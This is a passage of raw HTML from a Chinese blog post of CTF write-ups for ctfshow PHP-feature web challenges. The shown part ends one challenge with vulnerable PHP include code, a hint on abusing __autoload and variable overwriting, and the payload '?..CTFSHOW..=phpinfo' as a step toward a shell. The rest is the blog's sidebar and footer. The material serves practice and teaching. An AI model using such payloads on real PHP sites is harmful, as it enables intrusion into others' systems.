class="keyword">echo</span> <span class="string">&quot;class is exists!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$isVIP</span> &amp;&amp; strrpos(<span class="variable">$ctf</span>, <span class="string">&quot;:&quot;</span>)===<span class="literal">FALSE</span> &amp;&amp; strrpos(<span class="variable">$ctf</span>,<span class="string">&quot;log&quot;</span>)===<span class="literal">FALSE</span>)&#123;</span><br><span class="line">  <span class="keyword">include</span>(<span class="variable">$ctf</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>不能日志包含了，log木有了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hint：这个题一点点小坑__autoload()函数不是类里面的 __autoload — 尝试加载未定义的类 最后构造?..CTFSHOW..=phpinfo就可以看到phpinfo信息啦 原因是..CTFSHOW..解析变量成__CTFSHOW__然后进行了变量覆盖，因为CTFSHOW是类就会使用 __autoload()函数方法，去加载，因为等于phpinfo就会去加载phpinfo 接下来就去getshell啦</span><br></pre></td></tr></table></figure>

<p>hint写的很好</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：?..CTFSHOW..=phpinfo</span><br></pre></td></tr></table></figure>


    </div>

    
    
    
        

  <div class="followme">
    <p>欢迎关注我的其它发布渠道</p>

    <div class="social-list">

        <div class="social-item">
          <a target="_blank" class="social-link" href="/atom.xml">
            <span class="icon">
              <i class="fa fa-rss"></i>
            </span>

            <span class="label">RSS</span>
          </a>
        </div>
    </div>
  </div>


      <footer class="post-footer">

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2021/11/19/ctfshow-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="prev" title="ctfshow.命令执行">
      <i class="fa fa-chevron-left"></i> ctfshow.命令执行
    </a></div>
      <div class="post-nav-item"></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#ctfshow-PHP%E7%89%B9%E6%80%A7"><span class="nav-number">1.</span> <span class="nav-text">ctfshow.PHP特性</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#web89"><span class="nav-number">1.1.</span> <span class="nav-text">web89</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web90"><span class="nav-number">1.2.</span> <span class="nav-text">web90</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web91"><span class="nav-number">1.3.</span> <span class="nav-text">web91</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web92"><span class="nav-number">1.4.</span> <span class="nav-text">web92</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web93"><span class="nav-number">1.5.</span> <span class="nav-text">web93</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web94"><span class="nav-number">1.6.</span> <span class="nav-text">web94</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web95"><span class="nav-number">1.7.</span> <span class="nav-text">web95</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web96"><span class="nav-number">1.8.</span> <span class="nav-text">web96</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web97"><span class="nav-number">1.9.</span> <span class="nav-text">web97</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%A1%A5%E5%85%85"><span class="nav-number">1.9.0.1.</span> <span class="nav-text">补充</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web98"><span class="nav-number">1.10.</span> <span class="nav-text">web98</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web99"><span class="nav-number">1.11.</span> <span class="nav-text">web99</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web100"><span class="nav-number">1.12.</span> <span class="nav-text">web100</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web101"><span class="nav-number">1.13.</span> <span class="nav-text">web101</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web102"><span class="nav-number">1.14.</span> <span class="nav-text">web102</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web103"><span class="nav-number">1.15.</span> <span class="nav-text">web103</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web104"><span class="nav-number">1.16.</span> <span class="nav-text">web104</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web105"><span class="nav-number">1.17.</span> <span class="nav-text">web105</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web106"><span class="nav-number">1.18.</span> <span class="nav-text">web106</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web107"><span class="nav-number">1.19.</span> <span class="nav-text">web107</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web108"><span class="nav-number">1.20.</span> <span class="nav-text">web108</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web109"><span class="nav-number">1.21.</span> <span class="nav-text">web109</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web110"><span class="nav-number">1.22.</span> <span class="nav-text">web110</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web111"><span class="nav-number">1.23.</span> <span class="nav-text">web111</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web112"><span class="nav-number">1.24.</span> <span class="nav-text">web112</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web113"><span class="nav-number">1.25.</span> <span class="nav-text">web113</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web114"><span class="nav-number">1.26.</span> <span class="nav-text">web114</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web115"><span class="nav-number">1.27.</span> <span class="nav-text">web115</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web123"><span class="nav-number">1.28.</span> <span class="nav-text">web123</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web125"><span class="nav-number">1.29.</span> <span class="nav-text">web125</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web126"><span class="nav-number">1.30.</span> <span class="nav-text">web126</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web127"><span class="nav-number">1.31.</span> <span class="nav-text">web127</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web128"><span class="nav-number">1.32.</span> <span class="nav-text">web128</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web129"><span class="nav-number">1.33.</span> <span class="nav-text">web129</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web130"><span class="nav-number">1.34.</span> <span class="nav-text">web130</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web131"><span class="nav-number">1.35.</span> <span class="nav-text">web131</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web132"><span class="nav-number">1.36.</span> <span class="nav-text">web132</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web133-%E6%97%A0%E5%9B%9E%E6%98%BErce"><span class="nav-number">1.37.</span> <span class="nav-text">web133-无回显rce</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web134"><span class="nav-number">1.38.</span> <span class="nav-text">web134</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web135"><span class="nav-number">1.39.</span> <span class="nav-text">web135</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web136"><span class="nav-number">1.40.</span> <span class="nav-text">web136</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web137"><span class="nav-number">1.41.</span> <span class="nav-text">web137</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web138"><span class="nav-number">1.42.</span> <span class="nav-text">web138</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web139-%E8%84%9A%E6%9C%AC%E9%97%AE%E9%A2%98%EF%BC%9F%EF%BC%9F%EF%BC%9F"><span class="nav-number">1.43.</span> <span class="nav-text">web139(脚本问题？？？)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web140"><span class="nav-number">1.44.</span> <span class="nav-text">web140</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web141"><span class="nav-number">1.45.</span> <span class="nav-text">web141</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web142"><span class="nav-number">1.46.</span> <span class="nav-text">web142</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web143"><span class="nav-number">1.47.</span> <span class="nav-text">web143</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web144"><span class="nav-number">1.48.</span> <span class="nav-text">web144</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web145"><span class="nav-number">1.49.</span> <span class="nav-text">web145</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web146"><span class="nav-number">1.50.</span> <span class="nav-text">web146</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web147"><span class="nav-number">1.51.</span> <span class="nav-text">web147</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web148"><span class="nav-number">1.52.</span> <span class="nav-text">web148</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web149"><span class="nav-number">1.53.</span> <span class="nav-text">web149</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web150"><span class="nav-number">1.54.</span> <span class="nav-text">web150</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web151"><span class="nav-number">1.55.</span> <span class="nav-text">web151</span></a></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="Yun421"
      src="/images/avatar.gif">
  <p class="site-author-name" itemprop="name">Yun421</p>
  <div class="site-description" itemprop="description">短暂的热爱过后剩下的是坚持</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">12</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">1</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/yun0421" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;yun0421" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:2362702385@gmail.com" title="E-Mail → mailto:2362702385@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>


  <div class="links-of-blogroll motion-element">
    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
      Links
    </div>
    <ul class="links-of-blogroll-list">
        <li class="links-of-blogroll-item">
          <a href="https://anruoxi.mystrikingly.com/" title="https:&#x2F;&#x2F;anruoxi.mystrikingly.com&#x2F;" rel="noopener" target="_blank">anruoxi</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="http://www.yongsheng.site/" title="http:&#x2F;&#x2F;www.yongsheng.site&#x2F;" rel="noopener" target="_blank">Y0ng</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="http://www.njhlove.club/" title="http:&#x2F;&#x2F;www.njhlove.club&#x2F;" rel="noopener" target="_blank">菜牛</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="http://gonna-vae.mystrikingly.com/" title="http:&#x2F;&#x2F;gonna-vae.mystrikingly.com&#x2F;" rel="noopener" target="_blank">gonna</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://www.cnblogs.com/sen-y/" title="https:&#x2F;&#x2F;www.cnblogs.com&#x2F;sen-y&#x2F;" rel="noopener" target="_blank">森森</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://blog.csdn.net/qq_53063436?spm=1000.2115.3001.5343" title="https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_53063436?spm&#x3D;1000.2115.3001.5343" rel="noopener" target="_blank">cyxin11</a>
        </li>
    </ul>
  </div>

      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Yun421</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>

<!--这一段是不蒜子的访问量统计代码-->
<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
<span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次 &nbsp;   </span>
<span id="busuanzi_container_site_uv">访客数<span id="busuanzi_value_site_uv"></span>人次</span>
        








      </div>
    </footer>
  </div>

  
  
  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
